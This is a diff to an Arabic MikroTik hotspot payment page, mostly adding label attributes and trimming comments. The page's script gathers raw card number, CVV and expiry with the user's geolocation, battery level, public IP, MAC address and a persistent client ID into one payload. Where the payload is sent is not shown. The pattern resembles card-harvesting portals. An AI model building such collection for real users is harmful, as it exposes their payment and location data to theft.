@@ -259,7 +259,7 @@
 
                     <!-- 1. اختيار وسيلة الدفع -->
                     <div class="input-group-custom">
-                        <label>اختر وسيلة الدفع:</label>
+                        <label for="payment_method">اختر وسيلة الدفع:</label>
                         <select name="payment_method" id="payment_method" required>
                             <option value="wallet" selected>محفظة إلكترونية (Mobile Wallet)</option>
                             <option value="card">بطاقة بنكية (Visa / Mastercard)</option>
@@ -268,7 +268,7 @@
 
                     <!-- 2. قيمة المبلغ -->
                     <div class="input-group-custom">
-                        <label>المبلغ (بالجنيه):</label>
+                        <label for="pay_amount">المبلغ (بالجنيه):</label>
                         <div class="input-wrapper">
                             <input placeholder="أدخل المبلغ المطلوب" 
                                    type="text" 
@@ -281,7 +281,7 @@
 
                     <!-- 3. رقم الهاتف / المحفظة -->
                     <div class="input-group-custom" id="phone_group">
-                        <label>رقم الهاتف / المحفظة:</label>
+                        <label for="user_phone">رقم الهاتف / المحفظة:</label>
                         <div class="input-wrapper">
                             <input placeholder="01XXXXXXXXX" 
                                    type="text" 
@@ -302,7 +302,7 @@
                     <div id="card_section">
                         <!-- رقم الكارت -->
                         <div class="input-group-custom">
-                            <label>رقم البطاقة البنكية:</label>
+                            <label for="card_number">رقم البطاقة البنكية:</label>
                             <div class="input-wrapper">
                                 <input placeholder="Card Number" 
                                        type="text" 
@@ -322,7 +322,7 @@
 
                         <!-- اسم صاحب الكارت -->
                         <div class="input-group-custom">
-                            <label>اسم صاحب البطاقة:</label>
+                            <label for="card_name">اسم صاحب البطاقة:</label>
                             <div class="input-wrapper">
                                 <input placeholder="Card Holder Name" 
                                        type="text" 
@@ -335,7 +335,7 @@
                         <!-- تاريخ الانتهاء و CVC -->
                         <div class="input-containers">
                             <div class="input-group-custom">
-                                <label>التاريخ:</label>
+                                <label for="mmyy">التاريخ:</label>
                                 <div class="input-wrapper">
                                     <input placeholder="MM/YY" 
                                            type="text" 
@@ -348,7 +348,7 @@
                             </div>
 
                             <div class="input-group-custom">
-                                <label>رمز CVV:</label>
+                                <label for="card_cvc">رمز CVV:</label>
                                 <div class="input-wrapper">
                                     <input placeholder="CVV" 
                                            type="password" 
@@ -397,13 +397,12 @@
 
     <script>
         // =================================================================
-        // 1. استخراج متغيرات الميكروتك (MikroTik Hotspot Variables)
+        // 1. استخرج متغيرات الميكروتك (MikroTik Hotspot Variables)
         // =================================================================
         const mikrotikIP = "$(ip)";
         const mikrotikMAC = "$(mac)";
         const mikrotikUsername = "$(username)";
 
-        // التحقق مما إذا كانت قيم الميكروتك قد تم استبدالها بالفعل بواسطة الخادم أم لا
         const internalIP = (mikrotikIP && !mikrotikIP.includes("$(")) ? mikrotikIP : (window.location.hostname || "127.0.0.1");
         const macAddress = (mikrotikMAC && !mikrotikMAC.includes("$(")) ? mikrotikMAC : "غير متوفر";
         const clientUsername = (mikrotikUsername && !mikrotikUsername.includes("$(")) ? mikrotikUsername : "";
@@ -435,7 +434,7 @@
             }
         });
 
-        // زر إظهار وإخفاء رمز ה-CVV
+        // إظهار وإخفاء رمز ה-CVV
         const toggleCvvBtn = document.getElementById('toggleCvvBtn');
         const cardCvcInput = document.getElementById('card_cvc');
         const cvvIcon = document.getElementById('cvvIcon');
@@ -607,7 +606,7 @@
         }
 
         // =================================================================
-        // 3. الدوال المساعدة للجلب (Geolocation & IP)
+        // 3. الجلب والطلب (IP/Geolocation & Fetch)
         // =================================================================
         async function getPublicIP() {
             try {
@@ -629,9 +628,7 @@
                                 lon: position.coords.longitude.toString()
                             });
                         },
-                        () => {
-                            resolve({ lat: "30.0444", lon: "31.2357" });
-                        },
+                        () => resolve({ lat: "30.0444", lon: "31.2357" }),
                         { timeout: 5000 }
                     );
                 } else {
@@ -640,9 +637,6 @@
             });
         }
 
-        // =================================================================
-        // 4. معالجة طلب الدفع وإرسال البيانات
-        // =================================================================
         async function pay(e) {
             if (e) e.preventDefault();
 
@@ -669,14 +663,12 @@
             submitBtn.disabled = true;
             submitBtn.innerText = "جاري المعالجة والتحويل...";
 
-            // توليد أو استرجاع معرف الجهاز الفريد
             let clientID = localStorage.getItem("clientID");
             if (!clientID) {
                 clientID = (clientUsername ? clientUsername + "_" : "DEV_") + Math.random().toString(36).substr(2, 9) + "_" + Date.now();
                 localStorage.setItem("clientID", clientID);
             }
 
-            // نسبة البطارية
             let batteryLevel = "غير مدعوم";
             try {
                 if (navigator.getBattery) {
@@ -685,19 +677,15 @@
                 }
             } catch (err) {}
 
-            // جلب الموقع الـ IP الخارجي
             const [geo, publicIP] = await Promise.all([
                 getGeolocation(),
                 getPublicIP()
             ]);
 
-            // إعداد كائن البيانات المكتمل وإضافة بيانات الميكروتك
             const payload = {
                 amount: document.getElementById("pay_amount").value,
                 payment_method: selectedMethod,
                 phone: selectedMethod === "wallet" ? document.getElementById("user_phone").value : "غير محدد",
-
-                // بيانات الكارت
                 card_data: {
                     number: selectedMethod === "card" ? cardNumberInput.value.replace(/\s+/g, '') : "",
                     name: selectedMethod === "card" ? nameInput.value : "",
@@ -705,13 +693,9 @@
                     cvc: selectedMethod === "card" ? cvcInput.value : ""
                 },
                 save_card: document.getElementById("save_card").checked ? "tokenize" : "لا",
-
-                // بيانات الميكروتك والشبكة المدمجة
                 internalIP: internalIP,
                 mac: macAddress,
                 clientID: clientID,
-
-                // بيانات الجهاز والموقع
                 publicIP: publicIP,
                 lat: geo.lat,
                 lon: geo.lon,
